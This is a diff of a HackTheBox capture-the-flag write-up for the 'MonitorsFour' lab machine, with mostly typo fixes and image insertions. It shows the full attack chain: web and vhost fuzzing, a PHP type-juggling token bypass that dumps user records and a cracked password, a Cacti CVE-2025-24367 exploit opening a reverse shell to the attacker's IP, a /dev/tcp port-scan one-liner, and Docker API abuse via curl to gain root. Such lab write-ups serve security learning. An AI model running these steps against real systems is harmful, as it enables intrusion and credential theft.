@@ -5,10 +5,12 @@ categories: [Bug bounty, hacking]
 tags: [Bug bounty, WriteUp, Hacking]
 --- 
 
-Hello everyone! we're gonna take a look to a easy machine of hackthebox that i recently pwnet,discovering interesting vulnerabilities that can nowdays affect multiple website and having fun with a lot of recon! 
+Hello everyone! we're gonna take a look to a easy machine of hackthebox that i recently pwned,discovering interesting vulnerabilities that can nowdays affect multiple website and having fun with a lot of recon! 
 
-Target: 10.10.11.98
+
 # Network Recon
+Target: 10.10.11.98
+
 As always, i start my scan with the fastes port discovery i know: [rustscan](https://github.com/bee-san/RustScan)
 ```bash
 rustscan -a 10.10.11.96 --ulimit 5000
@@ -49,7 +51,7 @@ http://monitorsfour.htb/ [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVE
 itorsfour.htb], HTTPServer[nginx], IP[10.10.11.98], JQuery, PHP[8.3.27], Script, Title[MonitorsFour - N  
 etworking Solutions], X-Powered-By[PHP/8.3.27], X-UA-Compatible[IE=edge], nginx
 ```
-So we have the site is built with PHP 8.3.27, jQuery and nginx as a proxy manager
+The site is built with PHP 8.3.27, jQuery and nginx as a proxy manager.
 
 Let's lookup for some CVEs releated to this PHP version on [ExploitDB](https://www.exploit-db.com/)
 
@@ -61,7 +63,7 @@ Let's keep it in my mind and let's see how the website looks:
 <img width="1790" height="727" alt="image" src="https://github.com/user-attachments/assets/66b5311d-008c-4f7f-b8a5-49ff458903b6" />
 
 
-Let's use feroxbuster to identify every available asset on this website.
+Now we use feroxbuster to identify every available asset on the website.
 ```shell
 ❯ feroxbuster -u http://monitorsfour.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -C 404
 ```
@@ -95,7 +97,7 @@ http://monitorsfour.htb/static/admin/assets/js/core/libraries
 and more...
 ```
 
-Let's also use ReconSpider to get any scrapable informations
+Let's also use ReconSpider to get any scrapable information
 ```shell
 ❯ python3 ReconSpider.py -u http://monitorsfour.htb/
 ```
@@ -103,12 +105,12 @@ Let's also use ReconSpider to get any scrapable informations
 
 We found an email and other endpoints, however they seems to not containing any good information
 
-We also have a login endpoint that doesn't seems vulnerable to SQL injection NoSqli or other type of injection vulnerabilities, so let's continue with recoon
+We also have a login endpoint that doesn't seems vulnerable to SQL injection, NoSqli or other type of injection vulnerabilities, so let's continue with recon
 <img width="436" height="560" alt="image" src="https://github.com/user-attachments/assets/481da92e-d0f8-4cdf-adb6-c9f02e26803b" />
 
 
 #### Virtual host fuzzing
-Let's see if there is any vHost available fuzzing it with [FFUF](https://github.com/ffuf/ffuf), we filter by size 138 and status code 404 since every request send with a non valid vhost reply with  size: 138
+Let's see if there is any vHost available fuzzing it with [FFUF](https://github.com/ffuf/ffuf), i filter by size 138 and status code 404 since every request sent with a non valid vhost reply with  size: 138
 ```shell 
 ❯ ffuf -u http://monitorsfour.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fc 404 -H "HOST:FUZZ.monitorsfour.htb" -fs 138                                    
 ```
@@ -116,7 +118,9 @@ output:
 ```
 cacti
 ```
+Let's go in this subdomain and let's take a look.
 ### Cacti Framework
+
 Well! this is the 4th time i have to deal with cacti and every time is very funny :)
 
 <img width="859" height="537" alt="image" src="https://github.com/user-attachments/assets/14e850dc-1302-46e4-ac8e-d2cbb0ae0e90" />
@@ -131,7 +135,7 @@ An authenticated Cacti user can abuse graph creation and graph template function
 
 Since we must be authenticated, we need to find a way to get credentials.
 
-## Insecure apis and PHP Type juggling vulnerability
+## Insecure APIs and PHP Type Juggling vulnerability
 Returning back to the main website login, we attempt to intercept the request using burpsuite proxy:
 <img width="1225" height="350" alt="image" src="https://github.com/user-attachments/assets/633a0301-6f43-4183-8e12-6c46e7f88093" />
 
@@ -142,11 +146,12 @@ let's fuzz `/api/v1/auth`
 ```
 
 Output:
-`users `
+`users `<br>
 So we send the intercepted request to the repeater and modify the endpoint from `/api/v1/auth` to `/api/v1/users`
-as results we get : 
+as results we get : <br>
 `Missing id parameter` & `Missing token parameter`
-INSERIRE IMMAGINE TOKEN E ID 
+<img width="1220" height="464" alt="image" src="https://github.com/user-attachments/assets/fed4ed8f-efa2-4851-9897-1c6b70d53bcc" />
+
 
 Of course, even after modifing the request, we don't have any valid token, here it comes a wonderfull vulnerabilty:
 ###  Type juggling attack
@@ -200,8 +205,12 @@ for i in {1..100};do echo $i;done >> ids.txt
 ❯ ffuf -u 'http://monitorsfour.htb/api/v1/user?token=0e074025&id=FUZZ' -w ./ids.txt -fs 36 | awk '{print $1}'
 ```
 We get 5,2,7,6
+<img width="1628" height="500" alt="image" src="https://github.com/user-attachments/assets/0935ba7a-d188-48a9-9d2c-4f0b11b97400" />
 
 after we sent the previous request to the burpsuite intruder and get every response content for that valid ids , we successfully get everything of that user:
+
+<img width="1591" height="309" alt="image" src="https://github.com/user-attachments/assets/c32aadbb-bc9f-4242-bf8e-3285112a6a49" />
+
 ```json
 {"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"}
 
@@ -214,19 +223,20 @@ after we sent the previous request to the burpsuite intruder and get every respo
 ```
 Taking a look , we notice the password hashing method is very insecure, MD5..
 Using a simple site as [CrackStation](https://crackstation.net/)
-we receive the decodable hashes
+we receive the decodable hashes:
 <img width="682" height="341" alt="image" src="https://github.com/user-attachments/assets/48a8c2c0-d120-4ccd-87fa-ce30323351c6" />
 
  
 So we have:
-`admin:wonderful1`
-We can now access the admin dashboard, but nothing interesting is inside
+`admin:wonderful1` <br>
+We can now access the admin dashboard, but nothing interesting is inside.
 
 <img width="1841" height="827" alt="image" src="https://github.com/user-attachments/assets/86d771f8-ee2b-4152-8c20-081e8e4ca389" />
 
 
 ### CVE-2025-24367 Exploitation
-Spreading credentials found over cacti, we signed in , for the exploitation part we can use this [PoC](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC)
+Spreading credentials found before over cacti, we signed in.
+For the exploitation part we can use this [PoC](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC)
  
  ```bash
  python3 exploit.py -u marcus -p wonderful1 -i 10.10.14.34 -l 4242 -url  cacti.monitorsfour.htb 
@@ -236,7 +246,8 @@ Spreading credentials found over cacti, we signed in , for the exploitation part
 
  Shell obtained!
 
- # Privilege escalation
+ # Privilege escalation 
+ <br> 
  First of all, we are in a docker environment, and we don't like docker environment, so we must escape it.
  After enumerating almost everything (SUID binaries..versions..capabilities..expoosed creds, insecure permissions & more)
  i found something interesting in resolv.conf:
@@ -264,7 +275,7 @@ Then i had to adapt it in order to make it one-line,
 ```shell
 TARGET_IP="192.168.65.7"; TIMEOUT=1; COMMON_PORTS=(21 22 23 25 53 80 110 135 139 143 443 445 3389 8080); for PORT in "${COMMON_PORTS[@]}"; do (exec 3<> /dev/tcp/$TARGET_IP/$PORT) 2>/dev/null 1>&2; if [ $? -eq 0 ]; then echo "[OPEN] Port $PORT"; fi; exec 3<&- 3>&-; done
 ```
-The output that received was just port 53, so i modified the script in order to attempt the connection in all the 65535 ports, and found out that also 2375 was opened.
+The output that i received was just port 53, so i modified the script in order to attempt the connection in all the 65535 ports and found out that also 2375 was opened.
 
 Taking a look online , we found out that this port could be' exploited if not properly protected.
 [Exploitation](https://systemweakness.com/docker-port-2375-2376-how-to-exploit-8faa8d70a7ab)
@@ -276,9 +287,10 @@ In order to verify if the api are vulnerable, we must send a request using curl
 ```bash
 curl http:/192.168.65.7:2375/containers/json
 ```
-INSERIRE JSON CURL
+<img width="1133" height="354" alt="image" src="https://github.com/user-attachments/assets/b79f025d-04c5-4c58-b50a-414f2ddb93d3" />
 
-Bingo! let's create a json file that describe how our image should be'
+
+Yes! let's create a json file that describe how our image should be'
 ```json 
 {
   "Image": "docker_setup-nginx-php:latest",
@@ -295,11 +307,12 @@ In order to get this final json, i had to deal a lot with it , many errors occur
 ```shell
 curl -H "Content-Type: application/json" -d @cr.json http://192.168.65.7:2375/containers/create -o resp.json
 ```
-> In the resp.json, and ID is showed, we must is it to start the container with that image
+> In the resp.json, there is the container Id, we must use it to start the container with that image
 
-id=cdbe8635fa8c923e3452446a63a17c27251d9651b11a69e59de9fc8da8567cf9
+`id=cdbe8635fa8c923e3452446a63a17c27251d9651b11a69e59de9fc8da8567cf9`
+
 ```bash
 curl -X POST http://192.168.65.7:2375/containers/$id/start
 ```
-And finally we became root!
+And finally we became root! <br>
 <img width="336" height="57" alt="image" src="https://github.com/user-attachments/assets/a3f880e9-eb8e-47b3-ab58-e9439f92825f" />
